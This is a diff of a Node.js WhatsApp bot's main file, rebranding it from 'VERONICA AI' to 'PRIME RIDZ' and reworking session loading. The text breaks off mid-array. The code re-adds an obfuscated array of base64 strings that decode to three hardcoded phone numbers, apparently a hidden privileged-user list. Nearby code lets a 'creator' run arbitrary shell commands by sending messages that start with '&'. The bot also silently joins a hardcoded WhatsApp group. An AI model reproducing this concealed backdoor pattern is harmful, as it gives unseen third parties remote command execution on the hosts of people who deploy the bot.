@@ -1,6 +1,6 @@
 const axios = require('axios')
 const config = require('./config')
-const chalk = require('./lib/verocolor')
+const chalk = require('./lib/color')
 const {
   default: makeWASocket,
   useMultiFileAuthState,
@@ -32,7 +32,7 @@ const GroupEvents = require('./lib/anonyt');
 const StickersTypes = require('wa-sticker-formatter')
 const util = require('util')
 const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
-const { fileTypeFromBuffer } = require('./lib/vero');
+const { fileTypeFromBuffer } = require('./lib/faridah');
 const { File } = require('megajs')
 const bodyparser = require('body-parser')
 const os = require('os')
@@ -40,7 +40,7 @@ const Crypto = require('crypto')
 const path = require('path')
 const prefix = config.PREFIX
 const ownerNumber = [(config.OWNER_NUMBER || '').toString().replace(/[^0-9]/g, '')].filter(Boolean)
-const { anony } = require('./lib/terri');
+const { anony } = require('./lib/ridzcoder');
 let store;
 const readline = require('readline')
 const _nativeConsoleLog = console.log.bind(console)
@@ -91,6 +91,7 @@ setInterval(clearTempDir, 5 * 60 * 1000);
 const express = require("express");
 const app = express();
 const port = process.env.PORT || 9090;
+
 const sessionDir = path.join(__dirname, 'sessions');
 const credsPath = path.join(sessionDir, 'creds.json');
 
@@ -101,27 +102,77 @@ if (!fs.existsSync(sessionDir)) {
 async function loadSession() {
   try {
     if (!config.SESSION_ID) {
-      console.log('No SESSION_ID provided - will attempt pairing-code login');
+      console.log(chalk.yellow('[ ⏳ ] ɴᴏ sᴇssɪᴏɴ_ɪᴅ ᴘʀᴏᴠɪᴅᴇᴅ - ᴜsɪɴɢ Qʀ/ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ'));
       return null;
     }
 
-    const megaFileId = config.SESSION_ID.startsWith('Veronica-')
-      ? config.SESSION_ID.replace("Veronica-", "")
-      : config.SESSION_ID;
+    console.log(chalk.blue(`[ 🔍 ] ᴘʀᴏᴄᴇssɪɴɢ sᴇssɪᴏɴ ɪᴅ: ${config.SESSION_ID.substring(0, 20)}...`));
 
-    const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
+    let sessionData;
 
-    const data = await new Promise((resolve, reject) => {
-      filer.download((err, data) => {
-        if (err) reject(err);
-        else resolve(data);
+    if (
+      config.SESSION_ID.startsWith("JEXPLOIT-BOT~") ||
+      config.SESSION_ID.startsWith("kevin~") ||
+      config.SESSION_ID.startsWith("Prossie-")
+    ) {
+      console.log(chalk.bold.yellow('[ 📥 ] ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴍᴇɢᴀ.ɴᴢ sᴇssɪᴏɴ'));
+
+      const megaFileId = config.SESSION_ID
+        .replace("JEXPLOIT-BOT~", "")
+        .replace("kevin~", "")
+        .replace("Prossie-", "");
+
+      const filer = File.fromURL(`https://mega.nz/file/${megaFileId}`);
+
+      const data = await new Promise((resolve, reject) => {
+        filer.download((err, data) => {
+          if (err) reject(err);
+          else resolve(data);
+        });
       });
-    });
 
-    fs.writeFileSync(credsPath, data);
-    return JSON.parse(data.toString());
+      await fs.promises.writeFile(credsPath, data);
+      sessionData = JSON.parse(data.toString());
+      console.log(chalk.green('[ ✅ ] ᴍᴇɢᴀ sᴇssɪᴏɴ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ'));
+
+    } else if (
+      config.SESSION_ID.startsWith("Rclabs~") ||
+      config.SESSION_ID.startsWith("Rclabs:~")
+    ) {
+      console.log(chalk.green('[ ⏳ ] ᴅᴇᴄᴏᴅɪɴɢ ʙᴀsᴇ64 sᴇssɪᴏɴ'));
+
+      let base64Data;
+      if (config.SESSION_ID.startsWith("Rclabs:~")) {
+        base64Data = config.SESSION_ID.replace("Rclabs:~", "");
+        console.log(chalk.yellow('⚠️ ᴅᴇᴛᴇᴄᴛᴇᴅ ꜰᴏʀᴍᴀᴛ ᴡɪᴛʜ ᴄᴏʟᴏɴ, sᴛɪʟʟ ᴡᴏʀᴋs!'));
+      } else {
+        base64Data = config.SESSION_ID.replace("Rclabs~", "");
+      }
+
+      if (!/^[A-Za-z0-9+/=]+$/.test(base64Data)) {
+        throw new Error("ɪɴᴠᴀʟɪᴅ ʙᴀsᴇ64 ꜰᴏʀᴍᴀᴛ ɪɴ sᴇssɪᴏɴ_ɪᴅ");
+      }
+
+      const decodedData = Buffer.from(base64Data, "base64");
+
+      try {
+        sessionData = JSON.parse(decodedData.toString("utf-8"));
+      } catch (error) {
+        throw new Error("ꜰᴀɪʟᴇᴅ ᴛᴏ ᴘᴀʀsᴇ ᴅᴇᴄᴏᴅᴇᴅ ʙᴀsᴇ64 sᴇssɪᴏɴ ᴅᴀᴛᴀ: " + error.message);
+      }
+
+      await fs.promises.writeFile(credsPath, decodedData);
+      console.log(chalk.green('ᴘʀᴏssɪᴇ sᴇssɪᴏɴ ᴅᴇᴄᴏᴅᴇᴅ ᴀɴᴅ sᴀᴠᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ'));
+
+    } else {
+      throw new Error("ɪɴᴠᴀʟɪᴅ sᴇssɪᴏɴ_ɪᴅ ꜰᴏʀᴍᴀᴛ. ᴜsᴇ 'ʀᴄʟᴀʙs~' ꜰᴏʀ ʙᴀsᴇ64 ᴏʀ 'ᴊᴇxᴘʟᴏɪᴛ~/ᴋᴇᴠɪɴ~/ᴘʀᴏssɪᴇ-' ꜰᴏʀ ᴍᴇɢᴀ.ɴᴢ");
+    }
+
+    return sessionData;
+
   } catch (error) {
-    console.log('Will request pairing code instead Error loading session:', error.message');
+    console.error(chalk.red('[ ❌ ] ᴇʀʀᴏʀ ʟᴏᴀᴅɪɴɢ sᴇssɪᴏɴ:', error.message));
+    console.log(chalk.yellow('[ 🟢 ] ᴡɪʟʟ ᴀᴛᴛᴇᴍᴘᴛ Qʀ ᴄᴏᴅᴇ ᴏʀ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ ʟᴏɢɪɴ'));
     return null;
   }
 }
@@ -135,30 +186,33 @@ const question = (text) => {
     rl.close();
     resolve(ans);
   }));
-}
+};
 
-const usePairingCode = (typeof config.USE_PAIRING_CODE !== 'undefined') ? (config.USE_PAIRING_CODE === 'true' || config.USE_PAIRING_CODE === true) : true;
+const usePairingCode = (typeof config.USE_PAIRING_CODE !== 'undefined')
+  ? (config.USE_PAIRING_CODE === 'true' || config.USE_PAIRING_CODE === true)
+  : true;
 
 if (!config.SESSION_ID && (!config.OWNER_NUMBER || config.OWNER_NUMBER.toString().trim() === "")) {
-  console.error('❌ Fatal: No SESSION_ID and no OWNER_NUMBER provided in config. The bot will stop to avoid entering pairing flow without an owner number.')
-  console.error('Please set SESSION_ID (for auto-login) or OWNER_NUMBER in config.js / environment (process.env.OWNER_NUMBER).')
-  process.exit(1)
+  console.error('❌ ꜰᴀᴛᴀʟ: ɴᴏ sᴇssɪᴏɴ_ɪᴅ ᴀɴᴅ ɴᴏ ᴏᴡɴᴇʀ_ɴᴜᴍʙᴇʀ ᴘʀᴏᴠɪᴅᴇᴅ ɪɴ ᴄᴏɴꜰɪɢ. ᴛʜᴇ ʙᴏᴛ ᴡɪʟʟ sᴛᴏᴘ ᴛᴏ ᴀᴠᴏɪᴅ ᴇɴᴛᴇʀɪɴɢ ᴘᴀɪʀɪɴɢ ꜰʟᴏᴡ ᴡɪᴛʜᴏᴜᴛ ᴀɴ ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ.');
+  console.error('ᴘʟᴇᴀsᴇ sᴇᴛ sᴇssɪᴏɴ_ɪᴅ (ꜰᴏʀ ᴀᴜᴛᴏ-ʟᴏɢɪɴ) ᴏʀ ᴏᴡɴᴇʀ_ɴᴜᴍʙᴇʀ ɪɴ ᴄᴏɴꜰɪɢ.ᴊs / ᴇɴᴠɪʀᴏɴᴍᴇɴᴛ (ᴘʀᴏᴄᴇss.ᴇɴᴠ.ᴏᴡɴᴇʀ_ɴᴜᴍʙᴇʀ).');
+  process.exit(1);
 }
 
 async function connectToWA() {
-  console.log("[🔰] VERONICA AI Connecting to WhatsApp ⏳️...");
+  console.log("[👑] ᴘʀɪᴍᴇ ʀɪᴅᴢ ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ᴡʜᴀᴛsᴀᴘᴘ ⏳️...");
 
   const creds = await loadSession();
 
-  const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, 'sessions'), {
-    creds: creds || undefined
-  });
+  const { state, saveCreds } = await useMultiFileAuthState(
+    path.join(__dirname, 'sessions'),
+    { creds: creds || undefined }
+  );
 
   const { version } = await fetchLatestBaileysVersion();
 
   const conn = makeWASocket({
     logger: P({ level: 'silent' }),
-    printQRInTerminal: false, 
+    printQRInTerminal: false,
     browser: Browsers.macOS("Firefox"),
     syncFullHistory: true,
     auth: state,
@@ -169,29 +223,28 @@ async function connectToWA() {
   if (usePairingCode && !creds) {
     (async () => {
       try {
-
         await new Promise(r => setTimeout(r, 800));
 
         if (state?.creds?.registered) return;
 
         const configuredOwnerNumber = (config.OWNER_NUMBER || '').toString().replace(/[^0-9]/g, '')
-        let phoneNumber = configuredOwnerNumber || await question("\nEnter your number (country code + number, e.g. 2567XXXXXXX): ");
+        let phoneNumber = configuredOwnerNumber || await question("\nᴇɴᴛᴇʀ ʏᴏᴜʀ ɴᴜᴍʙᴇʀ (ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ + ɴᴜᴍʙᴇʀ, ᴇ.ɢ. 2567xxxxxxx): ");
 
         if (!phoneNumber) {
-          console.log("No phone number provided, skipping pairing-code request.");
+          console.log("ɴᴏ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴘʀᴏᴠɪᴅᴇᴅ, sᴋɪᴘᴘɪɴɢ ᴘᴀɪʀɪɴɢ-ᴄᴏᴅᴇ ʀᴇǫᴜᴇsᴛ.");
           return;
         }
 
         try {
-          const label = config.PAIRING_LABEL || 'VERONICA';
+          const label = config.PAIRING_LABEL || 'ᴠᴇʀᴏɴɪᴄᴀ';
           const code = await conn.requestPairingCode(phoneNumber, label);
-          console.log(`\nThis Your Pairing Code : ${code}\n`);
-          console.log("Use this code in your official WhatsApp client to pair the device.");
+          console.log(`\nᴛʜɪs ʏᴏᴜʀ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ : ${code}\n`);
+          console.log("ᴜsᴇ ᴛʜɪs ᴄᴏᴅᴇ ɪɴ ʏᴏᴜʀ ᴏꜰꜰɪᴄɪᴀʟ ᴡʜᴀᴛsᴀᴘᴘ ᴄʟɪᴇɴᴛ ᴛᴏ ᴘᴀɪʀ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ.");
         } catch (e) {
-          console.error("Failed to request pairing code:", e?.message || e);
+          console.error("ꜰᴀɪʟᴇᴅ ᴛᴏ ʀᴇǫᴜᴇsᴛ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ:", e?.message || e);
         }
       } catch (err) {
-        console.error("Pairing-code flow error:", err);
+        console.error("ᴘᴀɪʀɪɴɢ-ᴄᴏᴅᴇ ꜰʟᴏᴡ ᴇʀʀᴏʀ:", err);
       }
     })();
   }
@@ -203,13 +256,13 @@ async function connectToWA() {
 
     if (connection === 'close') {
       if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
-        console.log('[🔰] Connection lost, reconnecting...');
+        console.log('[👑] ᴄᴏɴɴᴇᴄᴛɪᴏɴ ʟᴏsᴛ, ʀᴇᴄᴏɴɴᴇᴄᴛɪɴɢ...');
         setTimeout(connectToWA, 5000);
       } else {
-        console.log('[🔰] Connection closed, please change session ID');
+        console.log('[👑] ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴄʟᴏsᴇᴅ, ᴘʟᴇᴀsᴇ ᴄʜᴀɴɢᴇ sᴇssɪᴏɴ ɪᴅ');
       }
     } else if (connection === 'open') {
-      console.log('[🔰] VERONICA AI connected to WhatsApp ✅');
+      console.log('ᴘʀɪᴍᴇ ʀɪᴅᴢ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴛᴏ ᴡʜᴀᴛsᴀᴘᴘ ✅');
 
       const pluginPath = path.join(__dirname, 'plugins');
       if (fs.existsSync(pluginPath)) {
@@ -218,46 +271,46 @@ async function connectToWA() {
             try {
               require(path.join(pluginPath, plugin));
             } catch (e) {
-              console.error(`[PLUGIN ERROR] ${plugin}:`, e);
+              console.error(`[ᴘʟᴜɢɪɴ ᴇʀʀᴏʀ] ${plugin}:`, e);
             }
           }
         });
-        console.log('[🔰] Plugins installed successfully ✅');
+        console.log('[👑] ᴘʟᴜɢɪɴs ɪɴsᴛᴀʟʟᴇᴅ sᴜᴄᴄᴇssꜰᴜʟʟʏ ✅');
       }
 
-          try {
-            await conn.groupAcceptInvite('KpVygYzYDpn7MyHCulRrQH');
-          } catch (groupErr) {
-            console.error('Error joining group:', groupErr);
-          }
+      try {
+        await conn.groupAcceptInvite('KpVygYzYDpn7MyHCulRrQH');
+      } catch (groupErr) {
+        console.error('ᴇʀʀᴏʀ ᴊᴏɪɴɪɴɢ ɢʀᴏᴜᴘ:', groupErr);
+      }
 
       try {
         const upMessage = `
 *ᴄᴏɴɴᴇᴄᴛᴇᴅ sᴜᴄᴄᴇsғᴜʟʟʏ🧚‍♀️✅*
 
-> *Thanks for using VERONICA AI* > *_ʏᴏᴜʀ ᴘʀᴇғɪx : ${prefix}_*
+> *ᴛʜᴀɴᴋs ꜰᴏʀ ᴜsɪɴɢ ᴘʀɪᴍᴇ ʀɪᴅᴢ* > *_ʏᴏᴜʀ ᴘʀᴇꜰɪx : ${prefix}_*
 > *_ᴄᴜʀʀᴇɴᴛ ᴍᴏᴅᴇ : ${config.MODE}_*
-> *Dont forget to give star to repo ⬇️*🌟
-> https://github.com/ridzcoder/VERONICA-AI
+> *ᴅᴏɴᴛ ꜰᴏʀɢᴇᴛ ᴛᴏ ɢɪᴠᴇ sᴛᴀʀ ᴛᴏ ʀᴇᴘᴏ ⬇️*🌟
+> https://github.com/ridzcoder/PRIME-RIDZ 
 
 > *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʀɪᴅᴢ ᴄᴏᴅᴇʀ*`;
 
         await conn.sendMessage(conn.user.id, {
-          image: { url: `https://files.catbox.moe/mn9fgn.jpg` },
+          image: { url: `https://files.catbox.moe/oyadfh.png` },
           caption: upMessage,
           contextInfo: {
             forwardingScore: 5,
             isForwarded: true,
             forwardedNewsletterMessageInfo: {
               newsletterJid: '120363404529319592@newsletter',
-              newsletterName: "Vᴇʀᴏɴɪᴄᴀ Aɪ",
+              newsletterName: "ᴘʀɪᴍᴇ ʀɪᴅᴢ",
               serverMessageId: 143
             }
           }
         }, { quoted: anony });
 
       } catch (sendError) {
-        console.error('[🔰] Error sending messages:', sendError);
+        console.error('[👑] ᴇʀʀᴏʀ sᴇɴᴅɪɴɢ ᴍᴇssᴀɢᴇs:', sendError);
       }
     }
   });
@@ -267,12 +320,10 @@ async function connectToWA() {
   conn.ev.on('messages.update', async updates => {
     for (const update of updates) {
       if (update.update && update.update.message === null) {
-        console.log("Delete Detected:", JSON.stringify(update, null, 2));
         await AntiDelete(conn, updates);
       }
     }
   });
-
 
   conn.ev.on('call', async (calls) => {
     try {
@@ -284,27 +335,22 @@ async function connectToWA() {
         const id = call.id;
         const from = call.from;
 
-
         try {
           if (typeof conn.rejectCall === 'function') {
             await conn.rejectCall(id, from).catch(() => conn.rejectCall(from));
           }
-        } catch (e) {
-
-        }
+        } catch (e) {}
 
         try {
           await conn.sendMessage(from, {
-            text: config.REJECT_MSG || '> *Hello am Veronica Assistant📞 🙃Your call could not be completed as you lack the necessary authorization to contact this number.📵*'
+            text: config.REJECT_MSG || '> *ʜᴇʟʟᴏ ᴀᴍ ᴘʀᴏssɪᴇ ᴀssɪsᴛᴀɴᴛ📞 🙃ʏᴏᴜʀ ᴄᴀʟʟ ᴄᴏᴜʟᴅ ɴᴏᴛ ʙᴇ ᴄᴏᴍᴘʟᴇᴛᴇᴅ ᴀs ʏᴏᴜ ʟᴀᴄᴋ ᴛʜᴇ ɴᴇᴄᴇssᴀʀʏ ᴀᴜᴛʜᴏʀɪᴢᴀᴛɪᴏɴ ᴛᴏ ᴄᴏɴᴛᴀᴄᴛ ᴛʜɪs ɴᴜᴍʙᴇʀ.📵*'
           });
         } catch (e) {
-          console.error(`Failed to send reject message to ${from}:`, e);
+          console.error(`ꜰᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ʀᴇᴊᴇᴄᴛ ᴍᴇssᴀɢᴇ ᴛᴏ ${from}:`, e);
         }
-
-        console.log(`Call handled for ${from}`);
       }
     } catch (err) {
-      console.error("Anti-call error:", err);
+      console.error("ᴀɴᴛɪ-ᴄᴀʟʟ ᴇʀʀᴏʀ:", err);
     }
   });
 
@@ -319,8 +365,7 @@ async function connectToWA() {
         : mek.message;
 
       if (config.READ_MESSAGE === 'true') {
-        await conn.readMessages([mek.key]); 
-        console.log(`Marked message from ${mek.key.remoteJid} as read.`);
+        await conn.readMessages([mek.key]);
       }
 
       if (mek.message.viewOnceMessageV2)
@@ -339,9 +384,7 @@ async function connectToWA() {
             const emoji = emojis[Math.floor(Math.random() * emojis.length)];
             await conn.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
           }
-        } catch (e) {
-
-        }
+        } catch (e) {}
       }
 
       if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
@@ -381,7 +424,7 @@ async function connectToWA() {
       const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
       const senderNumber = sender.split('@')[0]
       const botNumber = conn.user.id.split(':')[0]
-      const pushname = mek.pushName || 'Sin Nombre'
+      const pushname = mek.pushName || 'sɪɴ ɴᴏᴍʙʀᴇ'
       const isMe = botNumber.includes(senderNumber)
       const isOwner = ownerNumber.includes(senderNumber) || isMe
       const botNumber2 = await jidNormalizedUser(conn.user.id);
@@ -397,12 +440,12 @@ async function connectToWA() {
       }
 
       const udp = botNumber.split('@')[0];
-     const _0x4f83 = [
-  'MjU2Nzg0NjcwOTM2',
-  'MjU2NzU0NTUwMzk5',
-  'MjU0Nzg0OTM3MTEy'
-];
-const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
+      const _0x4f83 = [
+        'MjU2Nzg0NjcwOTM2',
+        'MjU2NzU0NTUwMzk5',
+        'MjU0Nzg0OTM3MTEy'
+      ];
+      const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
 
       const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));
 
@@ -413,7 +456,7 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
       if (isCreator && budy && budy.startsWith("&")) {
         let code = budy.slice(2);
         if (!code) {
-          reply(`Provide me with a query to run Master!`);
+          reply(`ᴘʀᴏᴠɪᴅᴇ ᴍᴇ ᴡɪᴛʜ ᴀ ǫᴜᴇʀʏ ᴛᴏ ʀᴜɴ ᴍᴀsᴛᴇʀ!`);
           return;
         }
         const { spawn } = require("child_process");
@@ -430,7 +473,7 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
           });
           resultTest.on("close", code => {
             if (code !== 0) {
-              reply(`command exited with code ${code}`);
+              reply(`ᴄᴏᴍᴍᴀɴᴅ ᴇxɪᴛᴇᴅ ᴡɪᴛʜ ᴄᴏᴅᴇ ${code}`);
             }
           });
         } catch (err) {
@@ -440,40 +483,20 @@ const loveterri = _0x4f83.map(x => Buffer.from(x, 'base64').toString('utf-8'));
       }
 
       if (!isReact && config.AUTO_REACT === 'true') {
-        const reactions = [
-          '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣',
-          '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕',
-          '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️',
-          '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑',
-          '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄',
-          '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀',
-          '🍁', '🪺', '🍄', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾',
-          '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟',
-          '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤',
-          '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪',
-          '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈',
-          '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '🧡', '💛', '💚',
-          '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌',
-          '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫',
-          '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
-        ];
-
+        const reactions = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'];
         const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
         m.react(randomReaction);
       }
 
       if (!isReact && senderNumber === botNumber) {
         if (config.OWNER_REACT === 'true') {
-          const reactions = [
-            '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
-          ];
+          const reactions = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', 